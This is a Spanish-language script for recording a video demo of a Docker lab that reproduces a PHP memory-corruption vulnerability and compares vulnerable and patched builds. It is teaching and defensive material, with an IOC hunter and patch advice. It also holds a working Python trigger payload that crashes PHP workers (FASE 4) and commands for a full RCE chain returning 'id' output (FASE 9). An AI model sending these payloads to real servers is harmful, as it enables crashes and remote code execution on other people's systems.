# DEMO — Guía de grabación de principio a fin

Guion operativo para grabar el vídeo de **PHP2Shell (CVE-2026-109618 /
CVE-2026-109619)** en el laboratorio. Cada fase tiene: el comando exacto, lo
que se verá en pantalla (salida real capturada en este lab) y el punto que
quieres explicar mientras ocurre.

> 💡 Todo el lab se opera con **un solo script**: `./p2s.sh` (up/down/test/rce/iocs/demo — ver README). Los comandos con `make` de este guion delegan en él.
>
> **Duración estimada: 6-9 min.** Si quieres la toma única sin cortes, el
> final incluye `make demo`, que ejecuta todo en secuencia.
>
> 💡 **Para que el público entienda el porqué en pantalla**: añade `--explain`
> a cualquier invocación del repro — imprime paneles didácticos ("CLASE")
> sincronizados con cada fase: el ciclo de vida del request, el bug de
> contadores/memoria, el timeline interno del worker y el límite blando del
> parche. El detalle completo está en [`ANATOMIA.md`](ANATOMIA.md).

---

## FASE 0 · Preparación (antes de pulsar "record")

```bash
# Parar y recrear los contenedores: los logs empiezan LIMPIOS,
# así el IOC hunter del final solo muestra hallazgos de TU demo.
docker compose down && docker compose up -d && sleep 4

# Confirmación rápida de que ambos objetivos responden
curl -s http://localhost:8081/whoami.php
curl -s http://localhost:8082/whoami.php
```

**Esperado:**

```text
worker=17 php=8.5.11 memory_limit=16M
worker=16 php=8.5.12 memory_limit=16M
```

Comprueba también que el terminal tiene fuente grande (el output de las
herramientas tiene color y formato: **no** uses `--no-color` para grabar).

> 🎙️ *Punto de narración:* "Tenemos dos servidores PHP idénticos en
> configuración. La única diferencia: 8.5.11 es la última release vulnerable
> de la rama 8.5, y 8.5.12 la primera parcheada. Mismo código, mismo límite de
> memoria, mismo Apache."

---

## FASE 1 · Reconocimiento: ¿qué versión de PHP corre ahí?

```bash
# 1) Cabecera estándar X-Powered-By (expose_php=On por defecto)
curl -sI http://localhost:8081/ | grep -i powered

# 2) El endpoint de identidad del lab: versión + PID del worker
curl -s http://localhost:8081/whoami.php
```

**Esperado:**

```text
X-Powered-By: PHP/8.5.11
worker=17 php=8.5.11 memory_limit=16M
```

> 🎙️ *"Primera fase de cualquier explotación: reconocimiento. La mayoría de
> los PHP en producción exponen su versión en las cabeceras — y aquí además
> vemos el PID del worker que nos está atendiendo. Acordaros de este PID, va a
> ser importante al final."*

**Repite contra el parcheado para plantar el contraste:**

```bash
curl -sI http://localhost:8082/ | grep -i powered   # → X-Powered-By: PHP/8.5.12
```

---

## FASE 2 · ¿Es vulnerable? — detección y clasificación con el script

```bash
python3 scripts/php2shell_repro.py http://localhost:8081/
```

(El script hace fingerprint y clasifica la versión contra la tabla oficial de
releases corregidas. Para la demo completa usa también `--container`, que es
la FASE 3; esta fase puedes grabarla tal cual para enseñar el fingerprint.)

**Esperado (fragmento):**

```text
── Fase 1/4 · Fingerprint del objetivo ───────────────────────────
[+] Objetivo accesible · HTTP 200 · 47 bytes
[+] PHP 8.5.11 detectado → vulnerable-by-version
```

> 🎙️ *"El script identifica la versión y la compara con la tabla de releases
> corregidas: 8.2.35, 8.3.36, 8.4.27 y 8.5.12. Todo lo anterior, vulnerable.
> Pero ojo: la versión por sí sola no demuestra nada — un atacante necesita
> confirmarlo. Eso es la fase 3."*

---

## FASE 3 · Verificación completa: el veredicto

```bash
# Con --explain: cada fase va acompañada de un panel didáctico
# (ideal para que el público entienda el porqué mientras ocurre)
python3 scripts/php2shell_repro.py http://localhost:8081/ \
        --container php2shell-vulnerable --explain
```

**Qué se verá, fase a fase (guion de pantalla):**

```text
── Fase 1/4 · Fingerprint del objetivo ───────────────────────────
[+] Objetivo accesible · HTTP 200 · 47 bytes
[+] PHP 8.5.11 detectado → vulnerable-by-version
[+] Worker identificado vía whoami.php → PID 17

── Fase 2/4 · Baseline (POST pequeño debe procesarse con normalidad)
[+] Baseline OK · HTTP 200 · el objetivo acepta POSTs normales

── Fase 3/4 · Trigger (POST con nombre de campo sobredimensionado)
  intento 1/3: nombre=3500 KiB → conexión cerrada sin respuesta  (600 ms)

── Fase 4/4 · Confirmación en logs y veredicto ───────────────────
Worker 17 → murió durante el trigger → reemplazado por 18
[*] Segfaults del worker: antes=0 después=1 (delta=1)
[*] Fatals OOM 'Unknown on line 0' nuevos en logs: +1

  ⚠  VULNERABLE — condición del CVE reproducida
```

> 🎙️ *Puntos clave mientras corre:*
> - **Baseline**: "primero un POST normal — el servidor está sano, no es
>   una caída aleatoria".
> - **Trigger**: "y ahora el request desencadenante: 3.5 MB de nombre de
>   campo. El servidor… cierra la conexión sin responder. Eso no es un
>   timeout: el worker ha muerto a mitad del request".
> - **Confirmación**: "delta de segfaults +1 confirmado en los logs, y el
>   worker 17 ya no existe: ha sido reemplazado por el 18".
> - **Veredicto**: "VULNERABLE — condición del CVE reproducida".

---

## FASE 4 · En vivo: el worker muere y es reemplazado (el remate visual)

Aquí es donde se *ve* la explotación de la vulnerabilidad tal y como está
implementada en el lab: el trigger fuerza el agotamiento de memoria durante la
inicialización del request; PHP deja el bucket de la HashTable a medio
construir; y durante el cleanup el worker interpreta esa basura como datos
válidos y **muere**.

```bash
# 1) Identidad del worker actual
curl -s http://localhost:8081/whoami.php        # → worker=17 ... (apunta el PID)

# 2) Trigger manual en vivo (mismo request que usa el script)
python3 - <<'EOF'
import urllib.request
filler = bytes(b for b in range(256) if b not in (0x26,0x3D,0x25)) + b"\x00"
body  = b"=" + (filler * 1100) + b"&a=1&" + b"Z"*3584000 + b"[x]=1"
req = urllib.request.Request("http://localhost:8081/", data=body,
      headers={"Content-Type":"application/x-www-form-urlencoded"}, method="POST")
try:
    urllib.request.urlopen(req, timeout=60)
    print("respuesta recibida")
except Exception as e:
    print(f"excepción: {type(e).__name__}  ← el worker murió sin responder")
EOF

# 3) El PID ya no es el mismo: el worker anterior está MUERTO
curl -s http://localhost:8081/whoami.php        # → worker=18 ...  ← ¡cambió!
```

**Esperado:** la excepción `RemoteDisconnected` en el paso 2 y un PID distinto
en el paso 3.

> 🎙️ *"Esto es la firma de la corrupción de estado: PHP interrumpe la
> inicialización a mitad de una inserción en la tabla hash interna, los
> contadores ya cuentan un bucket que nunca se inicializó, y cuando el
> request muere, el cleanup interpreta esos bytes basura como si fueran datos
> válidos del lenguaje. El resultado: el worker crasha. En el exploit real,
> el atacante controla esos bytes para que el cleanup acabe llamando a
> system() — aquí en el lab demostramos hasta la corrupción y su efecto, sin
> armar esa cadena."*

---

## FASE 5 · La evidencia forense: logs crudos

```bash
docker logs php2shell-vulnerable 2>&1 \
  | grep -E "Fatal error|Segmentation" | tail -4
```

**Esperado (par IOC-1 + IOC-2):**

```text
PHP Fatal error:  Allowed memory size of 16777216 bytes exhausted
(tried to allocate 3584032 bytes) in Unknown on line 0
AH00051: child pid 18 exit signal Segmentation fault (11), possible coredump
```

> 🎙️ *"Dos cosas aquí. El fatal de memoria con 'in Unknown on line 0': eso
> significa que el fallo ocurrió ANTES de que arrancara el script — ni
> autenticación ni firewalls de aplicación pueden hacer nada. Y el segfault
> del worker: el cleanup sobre el estado corrupto. Siendo un SOC, si ves el
> par de estos dos en el mismo worker, tienes explotación confirmada."*

---

## FASE 6 · Detección: el IOC hunter (lo que metes en tu SIEM)

```bash
python3 scripts/php2shell_iocs.py
```

**Esperado:**

```text
hallazgos: CRIT: 1, HIGH: 2, MED: 0 (tras una demo limpia)

  CRIT IOC-2  @ php2shell-vulnerable
    evidencia: worker pid 18 segfault (corrupción de estado)
  HIGH IOC-1  @ php2shell-vulnerable
    evidencia: OOM fatal: limit=16777216B intentó=3584032B en Unknown on line 0
  HIGH IOC-3  @ php2shell-vulnerable
    evidencia: POST / → HTTP 200 ... [correlacionado con OOM ±2s]

  ⚠  SEÑAL DE CORRUPCIÓN CONFIRMADA (build vulnerable)
```

> 🎙️ *"Cuatro IOCs: el fatal en request startup, el segfault, el POST
> correlacionado ±2 segundos con el OOM, y los avisos de cuerpos malformados.
> Este script es el que conectaríais a un cron o a vuestro SIEM."*

---

## FASE 7 · El contraste: el mismo ataque contra el parcheado

```bash
python3 scripts/php2shell_repro.py http://localhost:8082/ \
        --container php2shell-patched
```

**Esperado:**

```text
── Fase 3/4 · Trigger ...
  intento 1/3: nombre=3500 KiB → fatal OOM en respuesta  (43 ms)

── Fase 4/4 · Confirmación en logs y veredicto ───────────────────
Worker 16 sobrevivió al trigger (mismo PID)
[*] Segfaults del worker: antes=0 después=0 (delta=0)

  ✔  NOT_VULNERABLE — comportamiento de build parcheada
```

> 🎙️ *"Detalle que mucha gente no sabe: el parcheado TAMBIÉN muestra un fatal
> de memoria en Unknown on line 0 — es el 'límite blando' que añadió el fix:
> PHP pospone el error hasta un punto seguro. La diferencia es el destino del
> worker: aquí el PID no cambia, cero segfaults, estado limpio. Por eso el
> script lo clasifica como NOT_VULNERABLE."*

---

## FASE 8 · Cierre y remediación

```bash
make test-all    # ambos veredictos en una pasada
```

**Esperado:**

```text
✔ test-vuln: VULNERABLE (exit 0, esperado)
✔ test-patched: NOT_VULNERABLE (exit 1, esperado)
```

> 🎙️ Cierre: *"La lección: parchea a 8.5.12, 8.4.27, 8.3.36 o 8.2.35,
> reconstruye tus imágenes Docker y reinicia TODOS los workers. Las
> mitigaciones de configuración (memory_limit=-1, session.upload_progress
> disabled) no son fixes completos. Y si no puedes parchear hoy, corta el
> acceso y filtra en el reverse proxy los cuerpos enormes. Un like si te ha
> servido, y nos vemos en la próxima."*

---

## FASE 9 · El remate: RCE completo (opcional, pero es EL momento del vídeo)

> Requiere el vendor: `make vendor-exploit` (una vez). Detalles de la mecánica
> para narrar: [`EXPLOTACION.md`](EXPLOTACION.md).

**Opción A — canónica (determinista, recomendada):**

```bash
make rce-reproduce    # receta oficial del autor (Chain A, gdb + lab)
```

**Esperado:** JSON con `"verdict": "Proven - Lab-Assisted RCE"`, `"passed":
true` y los 19 gates en verde; termina con `✔ rce-reproduce`.

> 🎙️ A explicar: *"El token del marker acaba de aparecer DENTRO del contenedor
> (`/tmp/php-rce-lab`) — escrito por el propio proceso PHP a través de la
> cadena: el destructor de zval ejecutó `system()` con nuestro payload. Y el
> control negativo contra el 8.5.12 parcheado, no produce nada."*

**Opción B — remoto puro (la experiencia "exploit real"):**

```bash
make rce CMD="id"    # hasta 8 intentos con contenedor fresco por intento
```

**Esperado:** intentos con leak 512 B (`PHPSESSID` gigante) → fire → y en la
generación ASLR buena:

```text
RESULT fire=1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> 🎙️ A explicar: *"Esto es HTTP puro contra la config de fábrica — sin gdb,
> sin acceso local. Ojo con la honestidad: es probabilística por generación
> ASLR (el propio autor documenta 2/3–3/3 por arranque); el bucle automatiza
> la tirada con contenedores frescos hasta que el heap alinea. Si un intento
> falla es normal: cada boot es una nueva lotería de ASLR."*

---

## Toma única sin cortes

```bash
make demo
```

Ejecuta: identidad de workers → trigger vulnerable → contraste parcheado →
logs crudos → IOCs. (Los exit codes semánticos de las herramientas no abortan
la secuencia.) Para incluir el RCE, añade después `make rce-reproduce`.

## Tips de grabación

- **Terminal**: fuente 18-22pt, ventana ≥ 110 columnas (los banners miden 66
  caracteres + los mensajes largos), tema oscuro con colores vivos.
- **Timing**: el trigger tarda ~0.6-1 s en el vulnerable; el IOC hunter ~1 s.
  La demo completa con `make demo` ronda los 2-3 min — perfecto para una toma
  continua intercalada con tus tomas habladas.
- **Logs limpios**: si repites tomas, haz `docker compose down && docker
  compose up -d` entre tomas (los `docker logs` se acumulan; el IOC hunter
  arrastraría hallazgos de tomas anteriores — así el paso 6 muestra solo los
  IOCs de la toma que estás grabando).
- **El PID cambia entre tomas** (normal: Apache recicla workers). Enséñalo
  como detalle: "el PID concreto no importa, lo que importa es que CAMBIA
  tras el trigger y en el parcheado no".
- **`--json` para B-roll**: si quieres overlays gráficos en edición, graba
  también `python3 scripts/php2shell_repro.py ... --json | jq .verdict` para
  tener el veredicto en formato dato.

## Troubleshooting rápido

| Síntoma | Causa | Solución |
|---|---|---|
| `objetivo inalcanzable` (exit 3) | contenedores parados o aún arrancando | `docker compose up -d && sleep 4` |
| El trigger no mata al worker | logs contaminados de tomas previas (delta 0) | recrea contenedores (`down && up`) |
| `Input variables exceeded 1000` en la demo manual | el filler lleva bytes `&`, `=` o `%` | usa el snippet de la FASE 4 tal cual |
| IOC hunter muestra CRIT en tomas "limpias" | hallazgos de tomas anteriores en logs | recrea contenedores |
| Puerto 8081/8082 ocupado | otro servicio local | cambia el mapeo en `docker-compose.yml` |
| `make rce` falla 8/8 | racha de generaciones ASLR malas (delta fuera de ventana) | vuelve a lanzar: cada tirada crea contenedores frescos; es probabilística por diseño |
| `falta el vendor` en rce-reproduce | exploit aún no vendido | `make vendor-exploit` |
